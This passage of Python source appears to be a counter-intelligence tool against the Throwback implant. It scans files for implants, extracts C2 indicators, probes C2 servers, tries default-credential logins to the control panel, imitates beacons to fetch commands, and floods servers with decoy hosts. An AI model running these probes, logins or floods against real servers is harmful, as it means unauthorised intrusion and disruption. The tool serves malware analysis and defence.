	post_data = urllib.urlencode({KEY_DATA : final_qs })
	print_debug("Query:\n\t{:s}".format(post_data))

	_headers["Content-type"] ="application/x-www-form-urlencoded"

	c2_connection = None;
	url = urlparse(uri)
	if (url.scheme == "https"):
		c2_connection = httplib.HTTPSConnection(url.netloc)
	else:
		c2_connection = httplib.HTTPConnection(url.netloc)

	if (_session[KEY_PROXY_USE] == "1"):
		c2_connection.request("POST", _session[KEY_PROXY_NET], post_data, _headers)
	else:
		c2_connection.request("POST", url.path, post_data, _headers)
	response = c2_connection.getresponse()

	print_debug("{:d}: {:s}".format(response.status, response.reason))
	response_data = response.read()
	print_debug(response_data)
	command = ""
	marker = CMD_MARKER.format(_session[KEY_CCODE])
	match = re.search(marker, response_data)
	if (match):
		command = match.group(1).strip()
		if ("///" in command):
			command = command.split("///")[0]
	print_debug("Command received: '{:s}'.".format(command))
	return command

def download_file(_url, _local, _safecopy="", _compress=True, _password=DEFAULT_ZIP_PASS):
	urllib.urlretrieve (_url, _local)
	backup_copy = _safecopy
	if (os.path.isfile(_local)):
		if (len(_safecopy) > 0):
			if (_compress):
				backup_copy = "{:s}.7z".format(_safecopy)
				output = subprocess.check_output([PROG_7Z, "a", "-t7z", backup_copy, _local, "-p{:s}".format(_password)])

			shutil.copy(_local, backup_copy)
			if (not os.path.isfile(backup_copy)):
				raise Exception("Failed to backup '{:s}' to '{:s}'.".format(_local, backup_copy))
	else:
		raise Exception("Failed to download '{:s}'.".format(_url))
	return backup_copy
				

def webpage_exists(_target, _success, _headers={}):
	"""
	Verifies if the target webpage exists. This is done by matching a regular expression
	to the response obtained.

	@param _target Webpage to test
	@param _success Regular expression to match with the contents of the response.
	@param _headers Headers to send with the GET request
	@return True of the success RE was matched with the response
	"""
	#print_info("Verifying if '{:s}' is responding...".format(_target))
	c2_connection = None;
	url = urlparse(_target)
	if (url.scheme == "https"):
		c2_connection = httplib.HTTPSConnection(url.netloc)
	else:
		c2_connection = httplib.HTTPConnection(url.netloc)
	c2_connection.request("GET", url.path, headers=_headers)
	response = c2_connection.getresponse()

	response_data = response.read()
	return re.search(_success, response_data)

def tb_panel_hosted_on(_target, _headers={}):
	"""
	Verifies if the Throwback control panel is accessible on the target
	C2 server.

	@param _target URL of the C2 server
	@param _headers Headers to send with the GET request
	@return True if the control panel is hosted on the server.
	"""
	return webpage_exists("{:s}/{:s}".format(_target, URL_PATH_CP), "/images/tb.jpg", _headers)

def tb_sql_dtd_on(_target, _headers={}):
	"""
	Verifies if the SQL schema file remains from the installation process on the Throwback
	server. The schema can be used to obtain information, or indicate that no further
	action was undertook after installation.

	@param _target URL of the C2 server
	@param _headers Headers to send with the GET requests
	@return True if the SQL schema is accessible on the server.
	"""
	url = urlparse(_target)
	return webpage_exists("{:s}/{:s}".format(_target, URL_PATH_SQL), "throwbackcp", _headers)

def tb_panel_can_login(_target, _username, _password, _success, _headers={}):
	"""
	Verifies if the the provided set of credentials provides access to the
	Throwback control panel.

	@param _target URL of the C2 server.
	@param _username Username to use.
	@param _password Password to use.
	@param _success String on control panel to confirm successful login.
	@param _headers Headers to send with the POST request
	@return True of the success string was found in the response using the
		given credentials.
	"""
	c2_connection = None;
	url = urlparse(_target)
	print_info("Attempting to login to control panel at '{:s}://{:s}{:s}' with '{:s}'/'{:s}'...".format(
		url.scheme,
		url.netloc,
		url.path,
		_username,
		_password))
	if (url.scheme == "https"):
		c2_connection = httplib.HTTPSConnection(url.netloc)
	else:
		c2_connection = httplib.HTTPConnection(url.netloc)
	post_params = urllib.urlencode({
		"username": _username,
		"password": _password,
		"login"	: "Go"
	})

	_headers["Content-type"] ="application/x-www-form-urlencoded"

	c2_connection.request("POST", url.path, body=post_params, headers=_headers)
	response = c2_connection.getresponse()

	response_data = response.read()
	return re.search(_success, response_data)

def probe_tb_c2(_target, _headers={}):
	"""
	This function will attempt to gather some information about the given c2 server. It
	will conduct the following activities:

	1) Probe for the control panel of Throwback
	2) Probe for the SQL schema
	3) Attempt to use default credentials to log into the CP

	@param _target URL of the C2 server to target
	@param _headers Headers to use with the POST request
	"""
	url = urlparse(_target)
	path = url.path
	results = {}
	if (path[-1] != '/'):
		path = url.path.rsplit("/", 1)[0]
	root = "{:s}://{:s}{:s}".format(
		url.scheme,
		url.netloc,
		path)

	print_info("Probing C2 server at '{:s}'...".format(root))
	is_cp_avail = tb_panel_hosted_on(root, _headers)
	if (is_cp_avail):
		results["cp_exists"] = True
		print_success("Control Panel is accessible via '{:s}/{:s}'.".format(root, URL_PATH_CP))	

	is_schema_avail = tb_sql_dtd_on(root, _headers)
	if (is_schema_avail):
		results["sql_exists"] = True
		print_success("SQL schema is accessible on '{:s}/{:s}'.".format(root, URL_PATH_SQL))

	username = DEFAULT_CP_USER
	password = DEFAULT_CP_PASS
	if (tb_panel_can_login("{:s}/{:s}".format(root, URL_PATH_CP), username, DEFAULT_CP_PASS, "Current time is", _headers)):
		results["cp_user"] = username
		results["cp_pass"] = password
		print_success("Successfully logged into the control panel of '{:s}'!".format(root))
	return results

def create_querystring(_params):
	"""
	Creates a querystring from a dictionary of parameters. The returned string is
	not URLencoded.

	@param Dictionary containing the parameters
	@return A querystring.
	"""
	qs = ""
	for (param, value) in _params.iteritems():
		qs += "{:s}={:s}&".format(param, value)
	if (qs[-1] == "&"):
		qs = qs[:-1]
	return qs
	
def flood_c2_with_hosts(_uri, _nbhosts):
	for i in range(0, _nbhosts):
		host = generate_random_host()
		post_params = {}
		post_params.update(host)
		post_params.update(c2_serv)
		command = send_beacon(session, post_params, headers)

def command_desc(_command):
	"""
	Returns a description of the command extracted from the server.

	@param _command The code retrieved from the C2 server
	@return A description of the command
	"""
	cmds = {"0" :	"No Action",
		"1" :	"Execute File",
		"2" :	"Download and Execute Program",
		"3" :	"Download",
		"4" :	"Download and Execute Library",
		"5" :	"Set Callback Time",
		"6" :	"Upgrade",
		"7" :	"Uninstall",
		"8" :	"Install Service",
		"9" :	"Execute Shellcode",
		"10":	"Short Sleep"}
	if (_command in cmds):
		return cmds[_command]
	return "Unknown"

def log_info(_log, _msg):
	print_info(_msg)
	log(_log, _msg)

def log_error(_log, _msg):
	print_error(_msg)
	log(_log, _msg)

def log_warning(_log, _msg):
	print_warning(_msg)
	log(_log, _msg)

def log_success(_log, _msg):
	print_success(_msg)
	log(_log, _msg)

def print_debug(_msg):
	global verbose
	if (verbose):
		print_msg("[>] {:s}".format(_msg))
	
def print_info(_msg):
	print_msg("[*] {:s}".format(_msg))

def print_error(_msg):
	print_msg("[-] {:s}".format(_msg))
	
def print_warning(_msg):
	print_msg("[!] {:s}".format(_msg))
	
def print_success(_msg):
	print_msg("[+] {:s}".format(_msg))
	
def print_msg(_msg):
	print(_msg)
	
def banner():
    print(" _____               _  _  _                   _     ")
    print("|_   _|             | || || |                 | |    ")
    print("  | |   _ __   ___  | || || |__    __ _   ___ | | __ ")
    print("  | |  | '__| / _ \ | || || '_ \  / _` | / __|| |/ / ")
    print("  | |  | |   | (_) || || || |_) || (_| || (__ |   <  ")
    print("  \_/  |_|    \___/ |_||_||_.__/  \__,_| \___||_|\_\ ")
    print("                                               {:s}  ".format(__version__))
    print("")
    print("Copyright (C) 2015  Jonathan Racicot <cyberrecce@gmail.com>")
    print("This program comes with ABSOLUTELY NO WARRANTY. This is free")
    print("software, and you are welcome to redistribute it under certain conditions.")
    print("Visit https://github.com/infectedpacket for additional software.")
    print("")

def main(_args):
	try:
		session = {}
		headers = {}

		#session[KEY_TARGET] = _args.target_uri
		session[KEY_CIPHER_KEY] = _args.crypto_key
		session[KEY_CCODE] = _args.command_code
		session[KEY_XOR_KEY] = _args.strings_key
		session[KEY_AUTH_KEY] = _args.postauth_key
		
		global verbose
		verbose = _args.verbose
		
		try:
			f = open(_args.event_log, "w+")
			f.close()
			session[KEY_LOG] = _args.event_log
		except:
			if os.access(os.path.dirname(_args.event_log), os.W_OK):
				session[KEY_LOG] = _args.event_log
			else:
				print_error("No write access to '{:s}'.".format(_args.event_log))
				sys.exit(1)

		if (_args.down_dir):
			if (os.access(args.down_dir, os.W_OK)):
				session[KEY_DOWN_DIR] = _args.down_dir
			else:
				print_error("No write access to '{:s}'.".format(_args.down_dir))
				sys.exit(1)

		if (_args.back_dir):
			if (os.access(_args.back_dir, os.W_OK)):
				session[KEY_BACK_DIR] = _args.back_dir
			else:
				print_error("No write access to '{:s}'.".format(_args.back_dir))
				sys.exit(1)
		else:
			session[KEY_BACK_DIR] = tempfile.mkdtemp(prefix="windows_update_")
			log_info(session[KEY_LOG], "Backup directory created: '{:s}'.".format(session[KEY_BACK_DIR]))

		if _args.response_key:
			session[KEY_RESP_KEY] = _args.response_key
		if _args.hostname:
			session[KEY_HOSTNAME] = _args.hostname
		if _args.machine_id:
			session[KEY_MACHINEID] = _args.machine_id
		if (_args.host_ip):
			session[KEY_IPADDR] = _args.host_ip
		else:
			session[KEY_IPADDR] = ""
		if _args.no_execute:
			session[KEY_NOEXEC] = True
		else:
			session[KEY_NOEXEC] = False
		if (_args.proxy):
			session[KEY_PROXY_USE] = "1"
			session[KEY_PROXY_NET] = _args.proxy
		
		headers[KEY_UASTR] = DEFAULT_UA
		headers[KEY_PRAGMA] = NO_CACHE

		#
		# Contains known Tb-related files.
		target_files = []
	
		#
		# Contains known Tb C2 servers
		target_urls = []

		#
		#Add the targeted URLs provided by the user
		if (_args.target_uri):
			if (TARGET_DELIM in _args.target_uri):
				t = filter(None, _args.target_uri.split(TARGET_DELIM))
				target_urls += t
				print_info("Added {:d} target(s).".format(len(t)))
			else:
				target_urls.append(_args.target_uri)
				print_info("Added 1 target.")

		# 
		# Action: Scan file or directory
		#
		if (_args.action_scan):
			target = _args.action_scan
			#
			# Action: Recursively scan directory
			if (os.path.isdir(target)):
				target_files = scan_dir(target)
				if (len(target_files) > 0):
					print_success("Found {:d} Throwback implant(s) in '{:s}':".format(len(target_files), target))
					for f in target_files:
						print_success("\t{:s}".format(f))
				else:
					print_error("No Throwback implant located in '{:s}'.".format(target))
			#
			# Action: Scan a single file
			else:
				is_tb = scan_file_for_tb(target)
				if (is_tb):
					target_files.append(target)
					print_success("Throwback implant located in '{:s}'.".format(target))
				else:
					print_error("Failed to locate Throwback implant in '{:s}'.".format(target))

		#
		# Action: Search for files with keywords
		#
		if (_args.action_search):
			print(_args.action_search)
			location = _args.action_search[0]
			keywords = filter(None, _args.action_search[1].split(","))
			print(keywords)
			if (os.path.isdir(location)):
				files_found = scan_dir(location, _keywords=keywords)
				if (len(files_found) > 0):
					print_success("{:d} file(s) found:".format(len(files_found)))
					for f in files_found:
						print_success("\t{:s}".format(f))
				else:
					print_error("No files in '{:s}' matched any keywords provided.".format(location))
			else:
				str_found = scan_file(location, keywords)
				print_success("{:d} string(s) found:".format(len(str_found)))
				for s in str_found:
					print_success("\t{:s}".format(s))


		#
		# Action: Extract indicators from found files
		#
		if (_args.action_ind and len(target_files) > 0):
			for tb_file in target_files:
				tb_ind = extract_c2data(tb_file, session[KEY_XOR_KEY])
				if (len(tb_ind) > 0):
					for (param, value) in tb_ind.iteritems():
						print_success("\t{:s}:\t{:s}".format(param, value))
						if (KEY_TARGET in param):
							target_urls.append(value)
						session[param] = value
				else:
					print_error("Failed to extract indicators from '{:s}'.".format(tb_file))

		#
		# Action: Probe C2 servers
		#
		if (_args.action_probe and len(target_urls) > 0):
			for t in target_urls:
				probe_tb_c2(t, headers)
	
		#
		# Action: Start beaconing to C2 servers
		# 
		if _args.action_beacon:
			signal.signal(signal.SIGINT, signal_handler)
			session[KEY_CB_DELAY] = _args.action_beacon
			threads = []
			global IsBeaconing
			IsBeaconing = True
			host = generate_host(
				_machineid=session[KEY_MACHINEID],
				_hostname=session[KEY_HOSTNAME],
				_ipaddr=filter(None, session[KEY_IPADDR].split(".")))
			target_session = {}
			target_session.update(session)
			target_session.update(host)
			try:
				new_beacon = threading.Thread(target=start_beaconing, 
					args=(target_urls, target_session, headers))
				new_beacon.start()
				threads.append(new_beacon)
			except Exception as e:
				exc_type, exc_obj, exc_tb = sys.exc_info()
				print_error("Failed to start beaconing thread:")
				print_error("Line {:d}: {:s}".format(exc_tb.tb_lineo, e.message))

		#
		# Action: Flood the C2 server with decoys
		#
		if _args.action_flood:
			target = session[POST_URI]
			nb_hosts = _args.action_flood
			print_warning("Flooding '{:s}' with {:d} hosts...".format(target, nb_hosts))
			flood_c2_with_hosts(target, nb_hosts) 
	

	except Exception as e:
		exc_type, exc_obj, exc_tb = sys.exc_info()
		print("Line {:d}: {:s}".format(exc_tb.tb_lineno, e.message))
		traceback.print_tb(exc_tb, limit=7, file=sys.stdout)

if __name__ == "__main__":
	if (platform.system() == "Windows"):
		_ = os.system("cls")
	else:
		_ = os.system("clear")
	args = parser.parse_args()
	banner()
	main(args)
